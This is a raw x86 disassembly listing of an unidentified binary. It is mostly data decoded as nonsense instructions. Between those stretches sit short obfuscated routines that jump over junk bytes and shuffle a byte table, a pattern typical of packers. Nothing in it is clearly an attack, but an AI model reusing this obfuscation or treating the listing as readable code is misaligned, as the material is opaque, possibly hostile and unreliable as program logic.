  4083dc:	and    BYTE PTR [ebx-0x6c4aede2],ch
  4083e2:	xor    BYTE PTR [ecx-0x29441d92],ch
  4083e8:	test   al,0x55
  4083ea:	inc    ebx
  4083eb:	mov    ah,0x55
  4083ed:	leave  
  4083ee:	jle    0x40846e
  4083f0:	mov    bh,BYTE PTR [edi+0x7e]
  4083f3:	jle    0x40842f
  4083f5:	mov    cl,0xb9
  4083f7:	ror    DWORD PTR [edx],0x9
  4083fa:	add    edx,DWORD PTR [ebx-0x63]
  4083fd:	in     eax,0x4c
  4083ff:	cmp    BYTE PTR [eax+0x47],dl
  408402:	into   
  408403:	xchg   BYTE PTR [ebp-0x6ef06651],cl
  408409:	inc    esi
  40840a:	inc    esp
  40840b:	mov    cl,0x7f
  40840d:	scas   al,BYTE PTR es:[edi]
  40840e:	jge    0x408432
  408410:	or     BYTE PTR [ecx+eax*4-0x18],al
  408414:	aaa    
  408415:	push   ds
  408416:	jne    0x40845f
  408418:	(bad)  
  408419:	jge    0x4083fd
  40841b:	push   0xffffffdc
  40841d:	xchg   ecx,eax
  40841e:	mov    eax,ds:0x4b0ec51e
  408423:	lods   eax,DWORD PTR ds:[esi]
  408424:	jb     0x408469
  408426:	xchg   edi,eax
  408427:	push   0x31d280db
  40842c:	cmp    BYTE PTR [ebp+0x5f],0xcc
  408430:	cmp    ch,BYTE PTR [esi]
  408432:	(bad)  
  408433:	and    cl,BYTE PTR [ebp+eax*2-0x2a]
  408437:	not    BYTE PTR [edx]
  408439:	ss mov dh,0xc1
  40843c:	cmp    bp,sp
  40843f:	add    BYTE PTR [ebp-0x52],dl
  408442:	mov    ds:0x6b8d9f38,al
  408447:	inc    edi
  408448:	dec    ebx
  408449:	mov    cl,0x5
  40844b:	retf   
  40844c:	es pop esi
  40844e:	in     al,dx
  40844f:	push   DWORD PTR [edi]
  408451:	arpl   WORD PTR [ecx],si
  408453:	out    dx,al
  408454:	das    
  408455:	dec    edi
  408456:	and    esp,DWORD PTR [esi-0x42230f38]
  40845c:	fwait
  40845d:	shl    BYTE PTR [ebp+0x184562c4],1
  408463:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408464:	pop    edx
  408465:	fwait
  408466:	xor    eax,0x829d8d46
  40846b:	cwde   
  40846c:	(bad)  [ebx]
  40846e:	cdq    
  40846f:	dec    ebx
  408470:	call   DWORD PTR [ecx+0x26]
  408473:	xor    dh,ch
  408475:	lods   al,BYTE PTR ds:[esi]
  408476:	adc    DWORD PTR ds:0x8dafe7a3,ebx
  40847c:	ror    BYTE PTR [eax+0x13],0x53
  408480:	add    DWORD PTR [esi-0x76],edx
  408483:	ror    BYTE PTR [edi+eiz*1],0x7c
  408487:	lods   al,BYTE PTR ds:[esi]
  408488:	retf   0x383f
  40848b:	in     eax,0x39
  40848d:	inc    ebx
  40848e:	fidiv  DWORD PTR [edx-0x66790efb]
  408494:	push   ds
  408495:	jns    0x408504
  408497:	xor    al,0xf6
  408499:	adc    al,0x2b
  40849b:	or     ebx,esi
  40849d:	cli    
  40849e:	pop    edi
  40849f:	fnstsw WORD PTR ds:0x94cf19ea
  4084a5:	out    0x5b,eax
  4084a7:	outs   dx,BYTE PTR ds:[esi]
  4084a8:	inc    BYTE PTR [ecx-0xd]
  4084ab:	xor    ah,BYTE PTR [edx+0x3a569155]
  4084b1:	outs   dx,DWORD PTR ds:[esi]
  4084b2:	stos   BYTE PTR es:[edi],al
  4084b3:	test   al,0xbd
  4084b5:	data16 jecxz 0x40846f
  4084b8:	jmp    0x9b70:0x89b4f4ea
  4084bf:	mov    WORD PTR [edi+0x366fb584],?
  4084c5:	jns    0x4084b4
  4084c7:	jno    0x4084d5
  4084c9:	add    al,0xb3
  4084cb:	push   ds
  4084cc:	cmp    al,0x39
  4084ce:	jae    0x40854e
  4084d0:	mov    cl,BYTE PTR [eax]
  4084d2:	loop   0x408503
  4084d4:	pop    ebp
  4084d5:	cmp    eax,DWORD PTR [edi+0x48]
  4084d8:	sub    al,0x17
  4084da:	xchg   DWORD PTR [ecx+eax*1-0x5c8e2f5b],ecx
  4084e1:	cmp    esi,DWORD PTR [eax-0x1f]
  4084e4:	xchg   BYTE PTR [edx],bl
  4084e6:	ins    BYTE PTR es:[edi],dx
  4084e7:	inc    eax
  4084e8:	ss lock loopne 0x4084e7
  4084ec:	inc    esi
  4084ed:	lods   al,BYTE PTR ds:[esi]
  4084ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084ef:	cmp    eax,0xd774926f
  4084f4:	jecxz  0x40855d
  4084f6:	out    0x11,eax
  4084f8:	loop   0x408516
  4084fa:	cmp    BYTE PTR [esi-0x2a9af416],bl
  408500:	push   cs
  408501:	inc    ecx
  408502:	sbb    eax,0x84586318
  408507:	push   eax
  408508:	jp     0x4084ec
  40850a:	or     BYTE PTR [ecx+0x7dc85818],0x37
  408511:	jbe    0x4084d4
  408513:	outs   dx,BYTE PTR ds:[esi]
  408514:	out    dx,eax
  408515:	mov    ds:0xff5423e8,al
  40851a:	pop    ebx
  40851b:	shl    DWORD PTR [edi],cl
  40851d:	push   eax
  40851e:	or     esp,DWORD PTR [esi]
  408520:	jo     0x408531
  408522:	aam    0x49
  408524:	mov    BYTE PTR [edi-0xd5aeea9],al
  40852a:	call   0x781ef35f
  40852f:	pop    es
  408530:	cld    
  408531:	jns    0x4084d5
  408533:	hlt    
  408534:	mov    ds:0x5def3fb9,eax
  408539:	xor    ebp,DWORD PTR [edi-0x47]
  40853c:	je     0x408512
  40853e:	pop    ss
  40853f:	push   esi
  408540:	xor    BYTE PTR [edi+0x63baf3c8],0xbc
  408547:	in     al,0xc3
  408549:	sbb    edx,DWORD PTR [edi+0x26]
  40854c:	mov    ds:0xf181ceb9,eax
  408551:	adc    BYTE PTR [esi],0x90
  408554:	add    DWORD PTR [eax+0x114e17a2],ebx
  40855a:	mov    edx,0x132c570
  40855f:	inc    eax
  408560:	fisttp WORD PTR [eax+0x33]
  408563:	inc    esp
  408564:	push   ebp
  408565:	inc    edx
  408566:	jl     0x40859f
  408568:	pop    ebx
  408569:	nop
  40856a:	aad    0x97
  40856c:	adc    dh,al
  40856e:	clc    
  40856f:	cwde   
  408570:	fdivr  DWORD PTR [esi]
  408572:	jge    0x408560
  408574:	push   esi
  408575:	add    BYTE PTR [edx],al
  408577:	ficom  WORD PTR [ebp-0x7c]
  40857a:	fbld   TBYTE PTR [edx-0xe]
  40857d:	add    al,dl
  40857f:	jl     0x4085ab
  408581:	call   0x4fa0854e
  408586:	repz mov ecx,0x870fda3b
  40858c:	or     BYTE PTR [eax],al
  40858e:	add    BYTE PTR [eax],al
  408590:	mov    edx,DWORD PTR [ebp-0x34]
  408593:	jmp    0x408770
  408598:	mov    edx,DWORD PTR [ebp-0x3c]
  40859b:	mov    edi,DWORD PTR [ebp-0x4]
  40859e:	xor    edx,eax
  4085a0:	xor    edi,eax
  4085a2:	add    edx,ecx
  4085a4:	add    edi,ecx
  4085a6:	imul   edx,edi
  4085a9:	mov    edi,DWORD PTR [ebp-0x8]
  4085ac:	mov    ebx,DWORD PTR [ebp-0x10]
  4085af:	sub    ebx,edi
  4085b1:	jmp    0x408762
  4085b6:	add    eax,0x7405640f
  4085bb:	jne    0x408622
  4085bd:	(bad)  
  4085bf:	mov    eax,0x3227353f
  4085c4:	mov    WORD PTR [ecx],ss
  4085c6:	loope  0x40859f
  4085c8:	jle    0x408648
  4085ca:	mov    bh,BYTE PTR [edi+0x7e]
  4085cd:	jle    0x40855b
  4085cf:	mov    ebx,DWORD PTR [edi]
  4085d1:	dec    edi
  4085d2:	xor    esp,edi
  4085d4:	pop    ds
  4085d5:	sti    
  4085d6:	pop    ecx
  4085d7:	inc    edx
  4085d8:	mov    dl,0xda
  4085da:	outs   dx,DWORD PTR ds:[esi]
  4085db:	and    al,BYTE PTR [esi-0x46]
  4085de:	les    esi,FWORD PTR [eax+eiz*4+0x4d]
  4085e2:	and    al,0xaa
  4085e4:	outs   dx,DWORD PTR ds:[esi]
  4085e5:	retf   0x6b3d
  4085e8:	icebp  
  4085e9:	nop
  4085ea:	shl    BYTE PTR [edi+0x6],0xb3
  4085ee:	push   eax
  4085ef:	int    0xd4
  4085f1:	cmp    dh,ah
  4085f3:	js     0x40858c
  4085f5:	sub    al,0xa8
  4085f7:	es jb  0x408580
  4085fa:	add    dl,BYTE PTR [eax]
  4085fc:	das    
  4085fd:	in     eax,0x1b
  4085ff:	mov    dl,0x99
  408601:	fcom   QWORD PTR [esi-0x6d]
  408604:	(bad)  [ebp-0x4bf3876]
  40860a:	gs inc ebp
  40860c:	pop    es
  40860d:	xor    edi,ebp
  40860f:	arpl   si,bp
  408611:	in     eax,0x5c
  408613:	les    ecx,FWORD PTR [ebx-0x73772c78]
  408619:	and    edi,ebp
  40861b:	(bad)  
  40861c:	xchg   edx,eax
  40861d:	fldenv [edi]
  40861f:	arpl   WORD PTR [ecx],dx
  408621:	aaa    
  408622:	push   es
  408623:	aam    0xb6
  408625:	mov    esi,0x6eb55bff
  40862a:	push   edx
  40862b:	loope  0x40866a
  40862d:	imul   BYTE PTR [ebp-0x2fbb6da1]
  408633:	imul   eax,DWORD PTR [ebx+ebx*4],0xfffffff5
  408637:	mov    eax,ds:0x4f5e8012
  40863c:	imul   edx,DWORD PTR [ebx+0x70],0xffffff85
  408640:	adc    BYTE PTR [ebx],0xab
  408643:	call   0x41c70abf
  408648:	loop   0x408644
  40864a:	sbb    eax,0x8d317811
  40864f:	push   0x20
  408651:	add    DWORD PTR [edi+0x405945b9],eax
  408657:	nop
  408658:	xchg   ebx,eax
  408659:	js     0x408690
  40865b:	cwde   
  40865c:	inc    ebp
  40865d:	push   eax
  40865e:	mov    ds:0xac079530,al
  408663:	inc    eax
  408664:	stc    
  408665:	addr16 cwde 
  408667:	aaa    
  408668:	pop    ds
  408669:	mov    ch,0x1d
  40866b:	and    eax,0xaf9ab5f1
  408670:	mov    dl,BYTE PTR [ecx-0x42]
  408673:	cli    
  408674:	es pop eax
  408676:	rcl    edx,0x3f
  408679:	dec    edx
  40867a:	sahf   
  40867b:	adc    eax,esp
  40867d:	mov    ebp,0xd9279610
  408682:	mov    ch,0x9a
  408684:	cmp    dh,BYTE PTR [eax+0x75]
  408687:	or     DWORD PTR [edi+0x63b01281],edx
  40868d:	push   0xb
  40868f:	mov    fs,ebx
  408691:	fstp   TBYTE PTR [edx+0xd]
  408694:	xor    BYTE PTR [eax+0x179cf95d],dh
  40869a:	add    bl,dl
  40869c:	add    al,0x85
  40869e:	aam    0x74
  4086a0:	cwde   
  4086a1:	pop    ss
  4086a2:	inc    esp
  4086a3:	ret    0xc49
  4086a6:	in     al,0xa3
  4086a8:	mov    bl,0x4e
  4086aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086ab:	and    DWORD PTR [edi],edx
  4086ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086ae:	jg     0x40865f
  4086b0:	sub    DWORD PTR [edi-0x42a95b90],eax
  4086b6:	in     al,dx
  4086b7:	scas   eax,DWORD PTR es:[edi]
  4086b8:	ja     0x4086a4
  4086ba:	pop    ecx
  4086bb:	add    DWORD PTR [ecx-0x5c8599e],0xdb33c91d
  4086c5:	dec    esp
  4086c6:	popa   
  4086c7:	out    dx,al
  4086c8:	pusha  
  4086c9:	or     eax,0x90d255ef
  4086ce:	fisttp DWORD PTR [esi+0x630d636e]
  4086d4:	cmp    dl,BYTE PTR [edx]
  4086d6:	dec    esp
  4086d7:	jmp    0x408750
  4086d9:	jg     0x4086bc
  4086db:	mov    al,ds:0xa903f2f9
  4086e0:	mov    ah,0xc0
  4086e2:	outs   dx,BYTE PTR ds:[esi]
  4086e3:	(bad)  [edi-0x2c]
  4086e6:	(bad)  
  4086e7:	in     al,0xa4
  4086e9:	jge    0x408768
  4086eb:	mov    esp,0xe8c96b02
  4086f0:	and    DWORD PTR [eax],ebx
  4086f2:	cwde   
  4086f3:	(bad)  
  4086f4:	aam    0xc4
  4086f6:	xor    ecx,DWORD PTR [edi]
  4086f8:	or     al,0x5c
  4086fa:	aas    
  4086fb:	aad    0x6f
  4086fd:	shl    edi,1
  4086ff:	icebp  
  408700:	imul   edx,DWORD PTR [ebx+0x31],0x1ad97400
  408707:	mov    esi,0xc1bcf253
  40870c:	mov    ecx,0xc1aaf608
  408711:	cmc    
  408712:	jle    0x40875c
  408714:	push   ss
  408715:	fld    QWORD PTR [ebx]
  408717:	and    ah,cl
  408719:	mov    ds:0xb06bf132,al
  40871e:	sub    al,0xb2
  408720:	pop    edi
  408721:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408722:	rcr    esi,1
  408724:	inc    esp
  408725:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408726:	aaa    
  408727:	or     DWORD PTR [edi-0x11],ebp
  40872a:	sbb    bl,BYTE PTR [ebp+0x334674eb]
  408730:	(bad)  
  408732:	cmovle ebp,DWORD PTR [edx-0x3e]
  408736:	push   0xffffffa6
  408738:	lods   al,BYTE PTR ds:[esi]
  408739:	cwde   
  40873a:	or     ecx,DWORD PTR [ebp+0x53]
  40873d:	in     al,0x6d
  40873f:	popf   
  408740:	cld    
  408741:	add    ecx,DWORD PTR [esi]
  408743:	sub    BYTE PTR [edi-0x5],ah
  408746:	mul    dh
  408748:	sbb    ecx,DWORD PTR [ecx+eax*2+0x6a16a456]
  40874f:	or     ah,BYTE PTR [edx-0x3]
  408752:	ja     0x4087aa
  408754:	xor    ch,BYTE PTR [ebp+0x6589bcab]
  40875a:	stc    
  40875b:	mov    ds:0x48e9bc1b,al
  408760:	jae    0x4087c6
  408762:	cmp    ebx,edx
  408764:	mov    edx,DWORD PTR [ebp-0x38]
  408767:	jbe    0x408770
  40876d:	mov    edx,DWORD PTR [ebp-0x3c]
  408770:	mov    edi,DWORD PTR [ebp-0x4]
  408773:	xor    edi,eax
  408775:	xor    edx,eax
  408777:	add    edi,ecx
  408779:	add    edx,ecx
  40877b:	imul   edx,edi
  40877e:	mov    DWORD PTR [ebp+0xc],edx
  408781:	mov    edx,DWORD PTR [ebp+0xc]
  408784:	mov    DWORD PTR [ebp-0x24],edx
  408787:	mov    edx,DWORD PTR [ebp-0x8]
  40878a:	add    edx,DWORD PTR [ebp-0x40]
  40878d:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  408794:	mov    DWORD PTR [ebp-0x1c],edx
  408797:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40879e:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4087a5:	mov    edx,DWORD PTR [ebp-0x18]
  4087a8:	xor    edx,eax
  4087aa:	add    edx,ecx
  4087ac:	jmp    0x408819
  4087b1:	mov    edx,DWORD PTR [ebp-0x18]
  4087b4:	xor    edx,eax
  4087b6:	add    edx,DWORD PTR [ebp-0x14]
  4087b9:	mov    edi,DWORD PTR [ebp-0x1c]
  4087bc:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087c3:	mov    BYTE PTR [ebp+0xf],dl
  4087c6:	mov    edx,DWORD PTR [ebp-0xc]
  4087c9:	xor    edx,eax
  4087cb:	add    edx,DWORD PTR [ebp-0x14]
  4087ce:	mov    edi,DWORD PTR [ebp-0x1c]
  4087d1:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  4087d8:	mov    BYTE PTR [ebp+0xb],dl
  4087db:	mov    dl,BYTE PTR [ebp+0xf]
  4087de:	mov    edi,DWORD PTR [ebp-0xc]
  4087e1:	xor    edi,eax
  4087e3:	add    edi,DWORD PTR [ebp-0x14]
  4087e6:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087e9:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4087f0:	mov    dl,BYTE PTR [ebp+0xb]
  4087f3:	mov    edi,DWORD PTR [ebp-0x18]
  4087f6:	xor    edi,eax
  4087f8:	add    edi,DWORD PTR [ebp-0x14]
  4087fb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4087fe:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  408805:	mov    edx,DWORD PTR [ebp-0x44]
  408808:	mov    edi,DWORD PTR [ebp-0xc]
  40880b:	xor    edx,eax
  40880d:	xor    edi,eax
  40880f:	add    edx,ecx
  408811:	add    edi,ecx
  408813:	imul   edx,edi
  408816:	add    edx,DWORD PTR [ebp-0x14]
  408819:	mov    DWORD PTR [ebp-0x14],edx
  40881c:	mov    edx,DWORD PTR [ebp-0xc]
  40881f:	mov    edi,DWORD PTR [ebp-0x24]
  408822:	xor    edx,eax
  408824:	add    edx,ecx
  408826:	imul   edx,edi
  408829:	mov    edi,DWORD PTR [ebp-0xc]
  40882c:	xor    edi,eax
  40882e:	sub    edx,edi
  408830:	mov    edi,DWORD PTR [ebp-0xc]
  408833:	mov    ebx,DWORD PTR [ebp-0x14]
  408836:	jmp    0x4089e7
  40883b:	mov    ebx,0x516c50c8
  408840:	je     0x4088a5
  408842:	jmp    0xab204522
  408847:	mov    BYTE PTR [ecx-0x2a8212ad],dl
  40884d:	jle    0x4088cd
  40884f:	mov    bh,BYTE PTR [edi+0x7e]
  408852:	jle    0x4088a2
  408854:	(bad)  
  408855:	cmp    DWORD PTR [esi+eax*4],esp
  408858:	mov    eax,edx
  40885a:	mov    cl,BYTE PTR [eax-0xf]
  40885d:	adc    eax,0x88fad8ac
  408862:	dec    ebx
  408863:	and    BYTE PTR [edx-0x20],dl
  408866:	add    ch,ch
  408868:	call   0x774a3a5e
  40886d:	and    ah,al
  40886f:	push   es
  408870:	pop    ebx
  408871:	retf   
  408872:	cld    
  408873:	xchg   ecx,eax
  408874:	add    DWORD PTR [ebp-0x3e93136d],0x7d8808a5
  40887e:	mov    ds:0x5c989504,al
  408883:	in     eax,0x8a
  408885:	sbb    BYTE PTR [ebx],ah
  408887:	mov    ebp,DWORD PTR [ecx-0x67]
  40888a:	sub    bl,ah
  40888c:	xor    BYTE PTR [esi-0x7d],bl
  40888f:	popa   
  408890:	cwde   
  408891:	scas   eax,DWORD PTR es:[edi]
  408892:	out    0xe1,eax
  408894:	cmc    
  408895:	daa    
  408896:	shl    BYTE PTR [ebp+ebp*4+0x17c90c6a],cl
  40889d:	jmp    0xbd7e:0xeab1
  4088a3:	or     eax,0x70487eea
  4088a8:	pop    ebx
  4088a9:	in     al,dx
  4088aa:	jno    0x408866
  4088ac:	jl     0x40889d
  4088ae:	inc    eax
  4088af:	sub    eax,0xf79ab5f7
  4088b4:	adc    ebp,DWORD PTR [ebx+0x4e122368]
  4088ba:	or     eax,0xb89a3bd5
  4088bf:	xchg   esp,edx
  4088c1:	sbb    al,0x94
  4088c3:	add    ah,bh
  4088c5:	push   0x7e9f6e34
  4088ca:	sbb    eax,0x3f64560f
  4088cf:	add    edx,DWORD PTR [ebp+0x69]
  4088d2:	pop    ecx
  4088d3:	dec    ebp
  4088d4:	fbstp  TBYTE PTR [ebx]
  4088d6:	mov    ebp,0x63a412e6
  4088db:	xor    al,0xbf
  4088dd:	ins    DWORD PTR es:[edi],dx
  4088de:	cmc    
  4088df:	mov    ebx,esi
  4088e1:	sub    al,0x6a
  4088e3:	ins    BYTE PTR es:[edi],dx
  4088e4:	loop   0x40894e
  4088e6:	jge    0x40887d
  4088e8:	cmc    
  4088e9:	push   ss
  4088ea:	or     BYTE PTR [ecx+0x943013a],bl
  4088f0:	dec    esp
  4088f1:	push   ecx
  4088f2:	sub    bl,dl
  4088f4:	jb     0x408883
  4088f6:	ins    DWORD PTR es:[edi],dx
  4088f7:	jo     0x4088a7
  4088f9:	push   esp
  4088fa:	dec    esi
  4088fb:	jg     0x4088e5
  4088fd:	les    edi,FWORD PTR [ecx]
  4088ff:	mov    WORD PTR [edi+0x27617e8a],es
  408905:	pop    edi
  408906:	xchg   edx,eax
  408907:	push   ebp
  408908:	xrelease xchg DWORD PTR [ebx],edx
  40890b:	lahf   
  40890c:	xor    al,0x2d
  40890e:	ss daa 
  408910:	mov    cl,0xb1
  408912:	inc    ecx
  408913:	add    DWORD PTR [esi],ebx
  408915:	dec    ebx
  408916:	fidiv  WORD PTR [esi+eax*1]
  408919:	rol    BYTE PTR [ebp+edx*8+0x5d],cl
  40891d:	push   ss
  40891e:	scas   eax,DWORD PTR es:[edi]
  40891f:	xchg   ebp,eax
  408920:	(bad)  
  408921:	jmp    0x7a9b:0xa8732bcc
  408928:	aad    0x2f
  40892a:	adc    eax,0xb0d89e8c
  40892f:	pop    ebp
  408930:	std    
  408931:	pop    edi
  408932:	mov    bl,0x34
  408934:	dec    esi
  408935:	call   DWORD PTR [eax]
  408937:	(bad)
  40893a:	mov    esi,0xe343921c
  40893f:	jns    0x408951
  408941:	daa    
  408942:	pop    esi
  408943:	jo     0x40897d
  408945:	adc    bh,bl
  408947:	dec    edx
  408948:	lock jb 0x408928
  40894b:	mov    bh,0x23
  40894d:	jne    0x40894f
  40894f:	jnp    0x4089a2
  408951:	icebp  
  408952:	add    al,0x7f
  408954:	pop    eax
  408955:	in     al,dx
  408956:	sbb    ebp,DWORD PTR [edi-0x34]
  408959:	enter  0x60f8,0xaf
  40895d:	jns    0x408943
  40895f:	int3   
  408960:	dec    edi
  408961:	sbb    ch,0x5a
  408964:	div    BYTE PTR [edi+0xd09e107]
  40896a:	add    DWORD PTR [eax+0x4e99959c],eax
  408970:	lock data16 sbb BYTE PTR [ebp+0x59],ch
  408975:	lea    edx,[ebx+0x12381ab1]
  40897b:	dec    eax
  40897c:	and    eax,DWORD PTR cs:[ebx]
  40897f:	mov    dl,0x1e
  408981:	leave  
  408982:	xchg   DWORD PTR [ecx*2+0x38f23af6],esi
  408989:	fimul  DWORD PTR [edx-0x2a]
  40898c:	jne    0x4089bd
  40898e:	pusha  
  40898f:	aam    0xe7
  408991:	scas   eax,DWORD PTR es:[edi]
  408992:	pop    ecx
  408993:	out    0x5d,eax
  408995:	push   cs
  408996:	sub    DWORD PTR [edx+edx*2-0x28],edx
  40899a:	pop    ss
  40899b:	pop    ebx
  40899c:	or     BYTE PTR [esi-0x2ac621b3],dl
  4089a2:	(bad)  
  4089a3:	ins    BYTE PTR es:[edi],dx
  4089a4:	stos   DWORD PTR es:[edi],eax
  4089a5:	fistp  QWORD PTR [ebp-0x71]
  4089a8:	inc    esi
  4089a9:	rol    BYTE PTR [edx+0x74],0x50
  4089ad:	add    BYTE PTR [esi-0x56e9e118],bh
  4089b3:	or     DWORD PTR [esi-0xb],esp
  4089b6:	xchg   ecx,eax
  4089b7:	push   cs
  4089b8:	lahf   
  4089b9:	je     0x4089d5
  4089bb:	pop    ebp
  4089bc:	mov    cl,ch
  4089be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089bf:	dec    ebx
  4089c0:	inc    ebp
  4089c1:	sti    
  4089c2:	xor    ecx,DWORD PTR [ebx-0x6c]
  4089c5:	add    esi,DWORD PTR [eax+0x0]
  4089c8:	adc    ah,BYTE PTR [edi]
  4089ca:	xchg   BYTE PTR [eax],ch
  4089cc:	ja     0x4089e6
  4089ce:	xor    eax,0x2c21ccc1
  4089d3:	test   DWORD PTR [eax-0x7807e1b8],esi
  4089d9:	mov    al,0x21
  4089db:	imul   esi
  4089dd:	mov    esi,0xa0cc44de
  4089e2:	std    
  4089e3:	(bad)  
  4089e5:	and    BYTE PTR [ecx],ah
  4089e7:	xor    edi,eax
  4089e9:	add    edi,ecx
  4089eb:	imul   edi,ebx
  4089ee:	mov    ebx,DWORD PTR [ebp-0x18]
  4089f1:	xor    ebx,eax
  4089f3:	sub    edx,ecx
  4089f5:	jmp    0x408ba6
  4089fa:	dec    DWORD PTR [edx-0x5a]
  4089fd:	xor    eax,0x708df173
  408a02:	xchg   esp,eax
  408a03:	lea    ebx,[ecx+0xd]
  408a06:	ins    DWORD PTR es:[edi],dx
  408a07:	in     eax,0x94
  408a09:	call   0x7f8a:0x7e7ed289
  408a10:	jle    0x408a90
  408a12:	retf   0x4985
  408a15:	mov    DWORD PTR [edx+0x51],0xf8feec10
  408a1c:	mov    eax,0x385c1101
  408a21:	arpl   WORD PTR [ebx+0x79c147bd],di
  408a27:	outs   dx,BYTE PTR ds:[esi]
  408a28:	das    
  408a29:	(bad)  
  408a2b:	xor    al,cl
  408a2d:	test   BYTE PTR [ecx+ebp*8],bl
  408a30:	mov    DWORD PTR [ebx],edx
  408a32:	outs   dx,DWORD PTR ds:[esi]
  408a33:	inc    edx
  408a34:	and    ch,BYTE PTR [edi+0x32]
  408a37:	into   
  408a38:	mov    ecx,0x617e5f08
  408a3d:	adc    DWORD PTR [ebx+esi*1],0x4b
  408a41:	mov    ecx,0x27c34381
  408a46:	int3   
  408a47:	fidiv  WORD PTR ds:0xa6d19e43
  408a4d:	(bad)  
  408a4e:	shl    DWORD PTR [bx+si-0x51d7],cl
  408a53:	mov    ds:0xa4afa53,al
  408a58:	mov    bl,0x59
  408a5a:	lods   al,BYTE PTR ds:[esi]
  408a5b:	loope  0x408ada
  408a5d:	retf   0x26f7
  408a60:	cdq    
  408a61:	jne    0x408a43
  408a63:	stos   DWORD PTR es:[edi],eax
  408a64:	mov    ah,0x5f
  408a66:	gs jl  0x408a59
  408a69:	xor    cl,ah
  408a6b:	mov    eax,ds:0xba4d009e
  408a70:	xchg   BYTE PTR [edi+0x5201a5a2],ah
  408a76:	nop
  408a77:	and    BYTE PTR [ecx-0x7477ea3c],bh
  408a7d:	or     al,0x61
  408a7f:	adc    DWORD PTR [ebx-0x26],0xffffff87
  408a83:	sbb    edx,DWORD PTR [ecx]
  408a85:	and    DWORD PTR [edi+edi*8],ebx
  408a88:	lahf   
  408a89:	add    BYTE PTR [eax],dl
  408a8b:	add    bl,BYTE PTR [ebx]
  408a8d:	jp     0x408a51
  408a8f:	test   edx,edx
  408a91:	ret    
  408a92:	arpl   WORD PTR [eax+0x45],bx
  408a95:	scas   al,BYTE PTR es:[edi]
  408a96:	not    BYTE PTR [edx+0x28]
  408a99:	scas   eax,DWORD PTR es:[edi]
  408a9a:	fs jmp 0xc231d5c0
  408aa0:	dec    esi
  408aa1:	retw   0x350a
  408aa5:	ror    BYTE PTR [ebx],1
  408aa7:	fadd   QWORD PTR [edx+ebx*8-0x41]
  408aab:	pop    ebp
  408aac:	fs push ebp
  408aae:	sub    BYTE PTR [ebp-0x45],al
  408ab1:	pop    edi
  408ab2:	mov    eax,DWORD PTR [edx-0xa]
  408ab5:	das    
  408ab6:	adc    BYTE PTR [esi-0x78d15249],dh
  408abc:	or     al,0xc0
  408abe:	stos   DWORD PTR es:[edi],eax
  408abf:	(bad)  
  408ac1:	lock inc esp
  408ac3:	mov    eax,ds:0x2dddda1
  408ac8:	out    0x7e,eax
  408aca:	scas   al,BYTE PTR es:[edi]
  408acb:	mov    bh,0xaf
  408acd:	stos   DWORD PTR es:[edi],eax
  408ace:	mov    BYTE PTR [ebx*8-0x27b0cc88],dl
  408ad5:	push   cs
  408ad6:	inc    esi
  408ad7:	inc    ebx
  408ad9:	adc    ebx,DWORD PTR [edi+0x0]
  408adc:	adc    esi,DWORD PTR [edi]
  408ade:	add    esi,DWORD PTR [eax-0x4d79b9b8]
  408ae4:	adc    eax,0x5a33b1b6
  408ae9:	test   al,0xc7
  408aeb:	addr16 inc edx
  408aed:	fsubrp st(4),st
  408aef:	in     al,dx
  408af0:	paddsw mm6,QWORD PTR [ebx+0x26bcdf53]
  408af7:	pusha  
  408af8:	jl     0x408b3a
  408afa:	mov    al,ds:0x84b739d7
  408aff:	mov    ebp,0x22ba3380
  408b04:	(bad)  
  408b05:	push   esp
  408b06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b07:	dec    edi
  408b08:	nop
  408b09:	mov    dh,0x2b
  408b0b:	inc    esp
  408b0c:	add    eax,0xfece0a53
  408b11:	sub    eax,0x3f8ba1d1
  408b16:	(bad)  
  408b17:	xor    BYTE PTR [ebx-0x86e2f84],bh
  408b1d:	jl     0x408af2
  408b1f:	cs lock push 0xffffffc1
  408b23:	mov    bl,dh
  408b25:	iret   
  408b26:	xor    BYTE PTR [eax-0x80],bh
  408b29:	popf   
  408b2a:	xor    BYTE PTR [eax-0x30],ah
  408b2d:	in     al,0x23
  408b2f:	inc    edi
  408b30:	mov    fs,ebp
  408b32:	xor    BYTE PTR [edx+eax*8-0x57],bh
  408b36:	mov    ebx,DWORD PTR [ecx+0x364ea725]
  408b3c:	pushf  
  408b3d:	jbe    0x408b5f
  408b3f:	mov    esp,0xae1cd480
  408b44:	sbb    BYTE PTR [ebp+0x14d8adce],bh
  408b4a:	push   ecx
  408b4b:	and    ecx,esp
  408b4d:	add    edx,edi
  408b4f:	xlat   BYTE PTR ds:[ebx]
  408b50:	mov    WORD PTR ds:0x5a6970b0,?
  408b56:	sbb    DWORD PTR [ecx-0x713543fc],esp
  408b5c:	sub    esp,DWORD PTR ds:0xb7f29707
  408b62:	mov    bl,0xdd
  408b64:	add    edi,DWORD PTR [edi]
  408b66:	jg     0x408b61
  408b68:	cmp    al,0xd
  408b6a:	stos   DWORD PTR es:[edi],eax
  408b6b:	push   eax
  408b6c:	test   al,0x7b
  408b6e:	ins    DWORD PTR es:[edi],dx
  408b6f:	push   es
  408b70:	shr    DWORD PTR [esi],1
  408b72:	sbb    eax,0xe79c5cb0
  408b77:	jmp    0x408bdd
  408b79:	clc    
  408b7a:	xchg   ecx,eax
  408b7b:	inc    eax
  408b7c:	dec    ebp
  408b7d:	mov    eax,0x8401096c
  408b82:	adc    ebp,ecx
  408b84:	pop    eax
  408b85:	rcr    DWORD PTR [esi+0x780cdf43],cl
  408b8b:	gs popa 
  408b8d:	loope  0x408c00
  408b8f:	int3   
  408b90:	inc    edx
